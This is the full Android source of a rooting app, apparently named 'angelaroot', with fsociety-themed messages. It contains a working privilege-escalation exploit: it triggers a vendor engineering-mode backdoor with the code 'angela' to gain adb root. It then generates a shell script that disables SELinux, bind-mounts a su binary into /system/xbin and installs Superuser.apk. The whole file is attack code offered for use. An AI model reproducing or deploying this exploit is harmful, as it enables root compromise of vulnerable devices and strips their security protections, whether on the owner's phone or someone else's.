package com.mordred.angelaroot;

import android.app.ProgressDialog;
import android.content.Context;
import android.os.AsyncTask;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;

public class MainActivity extends AppCompatActivity {

    private String suBinPath;
    private String suAppPath;
    private String starterPath;

    private Button btn;
    private ProgressDialog pd;
    private TextView tv;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        suBinPath = getApplicationContext().getFilesDir().getAbsolutePath()
                + File.separator + "su";

        suAppPath = getApplicationContext().getFilesDir().getAbsolutePath()
                + File.separator + "Superuser.apk";

        starterPath = new File(getApplicationContext().getExternalFilesDir(null),
                "angelaroot_starter.sh").getAbsolutePath();

        tv = (TextView) findViewById(R.id.textView);
        btn = (Button) findViewById(R.id.button);
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                new AsyncTask<Void,Void,Void>() {
                    @Override
                    protected void onPreExecute() {
                        btn.setEnabled(false);
                        pd = new ProgressDialog(MainActivity.this);
                        pd.setMessage("Please wait Mr.Alderson...");
                        pd.setIndeterminate(true);
                        pd.setCancelable(false);
                        pd.show();
                        super.onPreExecute();
                    }

                    @Override
                    protected Void doInBackground(Void... params) {
                        doTheMagic();
                        return null;
                    }

                    @Override
                    protected void onPostExecute(Void t) {
                        // inform user
                        String infoMsg = "* Copied su binary ...\n* Copied Superuser.apk ...\n* Exploited vulnerability ...\n*Script is prepared ...";
                        tv.setText(infoMsg);

                        // SHOW SCRIPT PATH TO USER XXX
                        tv.setText(tv.getText() + "\n\n**************\nLast Step To Install Root:\n   Please connect your device to your PC and type the following command through terminal\n\nCommand: "
                                + "adb shell sh " + starterPath);
                        if (pd != null) {
                            pd.dismiss();
                        }
                        btn.setEnabled(true);
                        super.onPostExecute(t);
                    }
                }.execute();
            }
        });
    }

    public void doTheMagic() {
        // copy su from asset to in app dir
        copyFromAsset(getApplicationContext(), "su", suBinPath);

        // copy superuser app from asset to in app dir
        copyFromAsset(getApplicationContext(), "Superuser.apk", suAppPath);

        // exploit vuln to get adb root privilege
        exploitVuln();

        //prepare script to be executed through adb, to flash supersu
        try {
            prepareScript();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void prepareScript() throws IOException{
        printToFile(getStarterScript(), new File(starterPath));
    }

    public static void printToFile(String data, File saveFile) {
        if (saveFile.isFile()) {
            saveFile.delete();
        }
        FileWriter fw = null;
        BufferedWriter bw = null;
        PrintWriter pw = null;
        try {
            saveFile.createNewFile();
            fw = new FileWriter(saveFile);
            bw = new BufferedWriter(fw);
            pw = new PrintWriter(bw);

            pw.write(data);

        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                if (pw != null) {
                    pw.close();
                }

                if (bw != null) {
                    bw.close();
                }

                if(fw != null) {
                    fw.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public void exploitVuln() {
        Process process = null;
        try {
            process = Runtime.getRuntime().exec("am start -n com.android.engineeringmode/.qualcomm.DiagEnabled --es \"code\" \"angela\"");
            process.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (process != null) {
                process.destroy();
            }
        }
    }

    private void copyFromAsset(Context ct, String fileName, String targetPath) {
        try (InputStream in = ct.getAssets().open(fileName);
             OutputStream out = new FileOutputStream(targetPath)) {
            byte[] buffer = new byte[1024];
            int read;
            while((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }
        } catch(IOException e) {
            Log.e("tag", "Failed to copy asset file: ", e);
        }
    }

    public String getStarterScript() {
        return "#!/system/bin/sh\n" +
                "\n" +
                "echo \"info: angelaroot_starter.sh begin\"\n" +
                "\n" +
                "if [ -f " + suBinPath + " ]; then\n" +
                "    rm /data/local/tmp/su 2> /dev/null\n" +
                "    cp " + suBinPath + " /data/local/tmp/su\n" +
                "    echo \"info: su binary copied\"\n" +
                "    cp " + suAppPath + " /data/local/tmp/Superuser.apk\n" +
                "    echo \"info: Superuser app copied\"\n" +
                "    chmod 755 /data/local/tmp/su\n" +
                "    chmod 755 /data/local/tmp/Superuser.apk\n" +
                "    setenforce 0\n" +
                "    echo \"info: Selinux disabled\"\n" +
                "    mount -o bind /data/local/tmp/ /system/xbin/\n" +
                "    echo \"info: su binary mounted\"\n" +
                "    echo \"info: setting permissions of su binary...\"\n" +
                "    chmod 755 /system/xbin/su\n" +
                "    echo \"info: launching su...\"\n" +
                "    su --auto-daemon\n" +
                "    pm install -r /data/local/tmp/Superuser.apk\n" +
                "    echo \"info: Superuser.apk installed succesfully\"\n" +
                "    setprop persist.sys.adbroot 0\n" +
                "    echo \"YOUR DEVICE IS NOW ROOTED !!! WELCOME TO FSOCIETY\"\n" +
                "else\n" +
                "    echo \"su binary not exist, please open app and try again.\"\n" +
                "fi";
    }
}